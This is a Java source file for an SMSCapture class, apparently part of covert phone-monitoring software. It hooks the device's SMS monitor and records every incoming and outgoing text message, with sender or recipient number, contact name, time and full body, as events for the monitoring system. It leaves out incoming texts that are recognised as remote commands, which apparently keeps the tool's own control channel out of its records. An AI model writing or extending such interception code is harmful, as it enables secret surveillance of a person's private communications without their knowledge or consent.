package com.vvt.smsc;

import com.vvt.event.FxEventCapture;
import com.vvt.event.FxRecipient;
import com.vvt.event.FxSMSEvent;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.FxRecipientType;
import com.vvt.global.Global;
import com.vvt.rmtcmd.util.RmtCmdUtil;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSMessageMonitor;
import com.vvt.smsutil.SMSReceiverListener;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.std.Log;

public class SMSCapture extends FxEventCapture implements SMSReceiverListener, SMSSendListener {
	
	private SMSMessageMonitor smsMonitor = Global.getSMSMessageMonitor();
	private RmtCmdUtil rmtCmdUtil = new RmtCmdUtil();
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				setEnabled(true);
				smsMonitor.addSMSReceiverListener(this);
				smsMonitor.addSMSSendListener(this);
			}
		} catch(Exception e) {
			resetSMSCapture();
			notifyError(e);
		}
	}

	public void stopCapture() {
		try {
			if (isEnabled()) {
				setEnabled(false);
				smsMonitor.removeSMSReceiverListener(this);
				smsMonitor.removeSMSSendListener(this);
			}
		} catch(Exception e) {
			resetSMSCapture();
			notifyError(e);
		}
	}
	
	private void resetSMSCapture() {
		setEnabled(false);
		smsMonitor.removeSMSReceiverListener(this);
		smsMonitor.removeSMSSendListener(this);
	}
	
	private FxSMSEvent constructIncomingSMSEvent(FxSMSMessage smsMessage, FxDirection direction) {
		FxSMSEvent smsEvent = new FxSMSEvent();
		// To set sender number.
		smsEvent.setAddress(smsMessage.getNumber());
		// To set sender name.
		smsEvent.setContactName(smsMessage.getContactName());
		// To set direction.
		smsEvent.setDirection(direction);
		// To set event time.
		smsEvent.setEventTime(System.currentTimeMillis());
		// To set text message.
		smsEvent.setMessage(smsMessage.getMessage());
		return smsEvent;
	}
	
	private FxSMSEvent constructOutgoingSMSEvent(FxSMSMessage smsMessage, FxDirection direction) {
		FxSMSEvent smsEvent = new FxSMSEvent();
		FxRecipient recipient = new FxRecipient();
		// To set recipient information.
		recipient.setRecipientType(FxRecipientType.TO);
		recipient.setRecipient(smsMessage.getNumber());
		recipient.setContactName(smsMessage.getContactName());
		smsEvent.addRecipient(recipient);
		// To set direction.
		smsEvent.setDirection(direction);
		// To set event time.
		smsEvent.setEventTime(System.currentTimeMillis());
		// To set text message.
		smsEvent.setMessage(smsMessage.getMessage());
		return smsEvent;
	}

	// SMSReceiverListener
	public void onSMSReceived(FxSMSMessage smsMessage) {
		// Should not capture sms remote command. 
		if (!rmtCmdUtil.isSMSCommand(smsMessage.getMessage())) {
			FxSMSEvent smsEvent = constructIncomingSMSEvent(smsMessage, FxDirection.IN);
			notifyEvent(smsEvent);
		}
	}

	public void onSMSReceivedFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSCapture.onSMSReceivedFailed()", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		notifyError(e);
	}
	
	// SMSSendListener
	public void smsSendSuccess(FxSMSMessage smsMessage) {
		if (Log.isDebugEnable()) {
			Log.debug("SMSCapture.smsSendSuccess()", "contact name: " + smsMessage.getContactName() + " , msg: " + smsMessage.getMessage() + " , number: " + smsMessage.getNumber());
		}
		FxSMSEvent smsEvent = constructOutgoingSMSEvent(smsMessage, FxDirection.OUT);
		notifyEvent(smsEvent);
	}
	
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSCapture.smsSendFailed()", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		notifyError(e);
	}
}
